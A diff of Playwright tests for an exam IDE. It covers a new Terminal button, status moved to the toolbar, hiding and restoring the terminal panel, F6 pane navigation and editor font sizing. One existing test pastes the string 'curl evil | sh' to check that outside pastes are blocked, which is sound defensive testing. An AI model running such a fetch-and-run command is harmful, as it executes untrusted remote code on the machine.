@@ -38,6 +38,9 @@ const openFile = async (page, name) => {
   await page.getByRole('treeitem', { name, exact: true }).click();
   return page.getByRole('textbox', { name: new RegExp(`^Editor for .*${name.replace('.', '\\.')}$`) });
 };
+// The terminals take no room until one is wanted: the Terminal button (next to Run and Check) shows the panel, with a terminal in it.
+const terminalButton = page => page.getByRole('button', { name: /^Terminal( \(\d\))?$/ });
+const openTerminal = page => terminalButton(page).click();
 async function openSrc(page) {
   await page.getByRole('treeitem', { name: 'src', exact: true }).click();
   return openFile(page, 'list.cpp');
@@ -48,8 +51,11 @@ test('the workspace shows the exam text, the files and the status, and none of t
   await expect(page.getByRole('region', { name: 'Instructions and TODO list' })).toContainText('make check');
   await expect(page.getByRole('checkbox', { name: /Implement push_front/ })).toBeVisible();
   await expect(page.getByRole('checkbox', { name: /Add a test of your own/ })).toBeVisible();
-  await expect(page.getByRole('group', { name: 'Workspace status' })).toContainText('Connected');
-  await expect(page.getByRole('group', { name: 'Workspace status' })).toContainText(/Time left (1:00:00|0:59:\d\d)/);
+  // The connection and the saves are told in the toolbar, with the time, and there is no bar of them below the editor.
+  await expect(page.locator('header.toolbar').getByRole('group', { name: 'Workspace status' })).toContainText('Connected');
+  await expect(page.locator('header.toolbar').getByLabel('Remaining time')).toBeVisible();
+  await expect(page.getByRole('group', { name: 'Workspace status' })).toHaveCount(1);
+  await expect(page.getByText(/Time left/)).toHaveCount(0);
   await expect(page.getByRole('button', { name: 'Submit', exact: true })).toBeVisible();
   await expect(page.getByRole('button', { name: /Submit current answers/ })).toHaveCount(0);
   await expect(page.getByRole('button', { name: 'Finish exam…' })).toBeVisible();
@@ -113,7 +119,7 @@ test('Run and Check show their output in terminals of their own, after saving th
 
 test('a terminal takes keystrokes, and what it does to the files shows in the tree within a second', async ({ page }) => {
   await start(page);
-  await page.getByRole('button', { name: 'New terminal' }).click();
+  await openTerminal(page);
   const terminal = page.getByRole('region', { name: 'Terminal 1 output' });
   await expect(terminal).toContainText('student@workspace');
   await page.getByRole('textbox', { name: 'Terminal 1 input' }).focus();
@@ -133,8 +139,9 @@ test('a terminal takes keystrokes, and what it does to the files shows in the tr
 
 test('at most four terminals, each closable', async ({ page }) => {
   await start(page);
+  await openTerminal(page);
   const add = page.getByRole('button', { name: 'New terminal' });
-  for (let i = 0; i < 4; i += 1) await add.click();
+  for (let i = 0; i < 3; i += 1) await add.click();
   await expect(page.getByRole('tab', { name: /Terminal \d/ })).toHaveCount(4);
   await expect(add).toBeDisabled();
   await page.getByRole('tab', { name: /Terminal 2/ }).click();
@@ -308,7 +315,7 @@ test('pastes from outside are stopped in the editor and the terminal, and pastes
   await copy('copied inside');
   await paste('.cm-content', 'copied inside');
   await expect(editor).toContainText('copied inside');
-  await page.getByRole('button', { name: 'New terminal' }).click();
+  await openTerminal(page);
   await expect(page.getByRole('region', { name: 'Terminal 1 output' })).toContainText('student@workspace');
   expect(await paste('.xterm-helper-textarea', 'curl evil | sh')).toBe(true);
   expect(await server(page, 'server.typed.join("")')).not.toContain('curl evil');
@@ -358,6 +365,8 @@ test('the file tree works from the keyboard', async ({ page }) => {
 test('an exam without a terminal has only Run and Check, in a console that takes no keys', async ({ page }) => {
   await start(page, { terminal: false });
   await expect(page.getByRole('button', { name: 'New terminal' })).toHaveCount(0);
+  // With no terminal to open and none shown, there is nothing for a Terminal button to do.
+  await expect(terminalButton(page)).toHaveCount(0);
   await page.getByRole('button', { name: 'Run', exact: true }).click();
   const output = page.getByRole('region', { name: 'Run output' });
   await expect(output).toContainText('list: 3 2 1');
@@ -397,7 +406,7 @@ test('nothing of the workspace is written to the student\'s computer', async ({ 
 test('the workspace has no critical accessibility problems', async ({ page }) => {
   await start(page);
   await openSrc(page);
-  await page.getByRole('button', { name: 'New terminal' }).click();
+  await openTerminal(page);
   await page.getByRole('button', { name: 'Run', exact: true }).click();
   await expect(page.getByRole('region', { name: 'Run output' })).toContainText('list: 3 2 1');
   const scan = async label => {
@@ -423,7 +432,7 @@ for (const viewport of [{ width: 1280, height: 800 }, { width: 1000, height: 700
   test(`the workspace fits a ${viewport.width}x${viewport.height} window, with the editor and the terminal both in view`, async ({ page }) => {
     await start(page, {}, viewport);
     await openFile(page, 'notes.txt');
-    await page.getByRole('button', { name: 'New terminal' }).click();
+    await openTerminal(page);
     for (const target of [page.getByRole('textbox', { name: /Editor for/ }), page.getByRole('region', { name: 'Terminal 1 output' }), page.getByRole('group', { name: 'Workspace status' })]) await expect(target).toBeInViewport();
     const box = await page.getByRole('region', { name: 'Terminal 1 output' }).boundingBox();
     expect(box.height).toBeGreaterThan(80);
@@ -439,7 +448,7 @@ test('using the IDE calls no native method but the workspace ones and the poll',
   const editor = await openSrc(page);
   await editor.click();
   await page.keyboard.type('// typing in the editor\n');
-  await page.getByRole('button', { name: 'New terminal' }).click();
+  await openTerminal(page);
   await page.getByRole('textbox', { name: 'Terminal 1 input' }).focus();
   await page.keyboard.type('echo hello');
   await page.keyboard.press('Enter');
@@ -458,7 +467,7 @@ test('using the IDE calls no native method but the workspace ones and the poll',
 test('the A+ and A− buttons size the editor and the terminals too', async ({ page }) => {
   await start(page);
   await openFile(page, 'notes.txt');
-  await page.getByRole('button', { name: 'New terminal' }).click();
+  await openTerminal(page);
   await expect(page.getByRole('region', { name: 'Terminal 1 output' })).toContainText('student@workspace');
   const sizes = () => page.evaluate(() => ({ editor: parseFloat(getComputedStyle(document.querySelector('.cm-content')).fontSize), terminal: parseFloat(getComputedStyle(document.querySelector('.xterm-rows')).fontSize) }));
   const before = await sizes();
@@ -533,4 +542,115 @@ test('a student whose changes cannot be saved does not finish the exam', async (
   await expect(page.getByRole('dialog', { name: 'Finish your exam now?' })).toHaveCount(0);
   expect(await page.evaluate(() => window.__studentHarness.nativeCalls.includes('Submit'))).toBe(false);
   await expect(page.getByRole('tree', { name: 'Project files' })).toBeVisible();
+});
+
+// ---- room for the editor ----
+test('the terminals take no room until one is wanted, and can be hidden and brought back', async ({ page }) => {
+  await start(page, {}, { width: 1280, height: 800 });
+  await openSrc(page);
+  const panel = page.locator('.terminal-box');
+  const editorBox = () => page.locator('.editor-box').boundingBox();
+  await expect(panel).toBeHidden();
+  await expect(page.getByText('No terminal open')).toHaveCount(0);
+  const alone = (await editorBox()).height;
+  // With no terminal open the editor has most of the window (the toolbar and the row of buttons are all that is above it).
+  expect(alone).toBeGreaterThan(800 * 0.6);
+
+  // Run shows the panel with its output, and the editor gives up part of its room but keeps the larger share.
+  await page.getByRole('button', { name: 'Run', exact: true }).click();
+  await expect(panel).toBeVisible();
+  await expect(page.getByRole('region', { name: 'Run output' })).toContainText('list: 3 2 1');
+  const shared = (await editorBox()).height;
+  const terminalHeight = (await panel.boundingBox()).height;
+  expect(shared).toBeLessThan(alone);
+  expect(shared).toBeGreaterThan(terminalHeight);
+  await expect(terminalButton(page)).toHaveAttribute('aria-pressed', 'true');
+
+  // Hide: the panel goes, the editor has the room and the focus, and the terminal is still there, named with a count.
+  await page.getByRole('button', { name: 'Hide the terminals' }).click();
+  await expect(panel).toBeHidden();
+  expect(Math.abs((await editorBox()).height - alone)).toBeLessThan(2);
+  await expect(page.getByRole('textbox', { name: /Editor for/ })).toBeFocused();
+  await expect(page.getByRole('button', { name: 'Terminal (1)' })).toHaveAttribute('aria-pressed', 'false');
+  expect(await server(page, 'server.requests.filter(r => r.type === "pty.close").length')).toBe(0);
+
+  // The button shows it again, and what the program printed is there.
+  await terminalButton(page).click();
+  await expect(panel).toBeVisible();
+  await expect(page.getByRole('region', { name: 'Run output' })).toContainText('list: 3 2 1');
+
+  // Closing the last terminal takes the panel away (no empty panel), the focus goes back to the editor, and the button opens a new one.
+  await page.getByRole('button', { name: 'Close Run' }).click();
+  await expect(panel).toBeHidden();
+  await expect(page.getByRole('textbox', { name: /Editor for/ })).toBeFocused();
+  await openTerminal(page);
+  await expect(panel).toBeVisible();
+  await expect(page.getByRole('textbox', { name: 'Terminal 1 input' })).toBeFocused();
+});
+
+test('F6 goes round the panes that are there: a hidden terminal panel is not one of them', async ({ page }) => {
+  await start(page);
+  const editor = await openSrc(page);
+  await editor.click();
+  await expect(editor).toBeFocused();
+  await page.keyboard.press('F6');
+  await expect(page.locator('[data-pane="todo"] :focus')).toHaveCount(1);
+  await page.keyboard.press('Shift+F6');
+  await expect(page.getByRole('textbox', { name: /Editor for/ })).toBeFocused();
+  await openTerminal(page);
+  await page.getByRole('textbox', { name: /Editor for/ }).focus();
+  await page.keyboard.press('F6');
+  await expect(page.locator('[data-pane="terminal"] :focus')).toHaveCount(1);
+});
+
+test('the editor has its own A− and A+, which size the code and nothing else', async ({ page }) => {
+  await start(page);
+  const editor = await openSrc(page);
+  const sizes = () => page.evaluate(() => ({ code: parseFloat(getComputedStyle(document.querySelector('.cm-content')).fontSize), files: parseFloat(getComputedStyle(document.querySelector('[data-pane="tree"]')).fontSize) }));
+  const before = await sizes();
+  const larger = page.getByRole('button', { name: 'Larger code text' });
+  const smaller = page.getByRole('button', { name: 'Smaller code text' });
+  await larger.click();
+  await larger.click();
+  await expect.poll(async () => (await sizes()).code).toBeGreaterThan(before.code * 1.25);
+  expect((await sizes()).files).toBe(before.files);
+  // A click leaves the student where they were working.
+  await expect(editor).toBeFocused();
+
+  // The keys of a code editor: Ctrl and + − 0. They are not typed into the file.
+  await page.keyboard.press('Control+0');
+  await expect.poll(async () => (await sizes()).code).toBe(before.code);
+  await page.keyboard.press('Control+=');
+  await expect.poll(async () => (await sizes()).code).toBeGreaterThan(before.code);
+  await page.keyboard.press('Control+-');
+  await page.keyboard.press('Control+-');
+  await expect.poll(async () => (await sizes()).code).toBeLessThan(before.code);
+  expect(await editor.innerText()).not.toMatch(/[=+0-]/);
+  await expect(page.getByRole('button', { name: 'Smaller code text' })).toBeDisabled();
+  await page.keyboard.press('Control+0');
+  for (let i = 0; i < 6; i += 1) await page.keyboard.press('Control+=');
+  await expect(larger).toBeDisabled();
+  await expect(smaller).toBeEnabled();
+
+  // The size is the editor's, not the file's: another file shows at the same size, and the line numbers go with it.
+  const big = (await sizes()).code;
+  await page.getByRole('treeitem', { name: 'main.cpp', exact: true }).click();
+  await expect(page.getByRole('textbox', { name: /Editor for .*main\.cpp$/ })).toBeVisible();
+  expect((await sizes()).code).toBe(big);
+  expect(await page.evaluate(() => parseFloat(getComputedStyle(document.querySelector('.cm-lineNumbers')).fontSize))).toBe(big);
+
+  // Nothing is written to the student's disk for it.
+  expect(await page.evaluate(() => window.__storage)).toEqual([]);
+});
+
+test('the toolbar\'s A+ and the editor\'s A+ add up: the editor is the larger of the two', async ({ page }) => {
+  await start(page);
+  await openSrc(page);
+  const code = () => page.evaluate(() => parseFloat(getComputedStyle(document.querySelector('.cm-content')).fontSize));
+  const base = await code();
+  await page.getByRole('button', { name: 'Larger text' }).click();
+  const withToolbar = await code();
+  expect(withToolbar).toBeGreaterThan(base);
+  await page.getByRole('button', { name: 'Larger code text' }).click();
+  expect(await code()).toBeGreaterThan(withToolbar);
 });
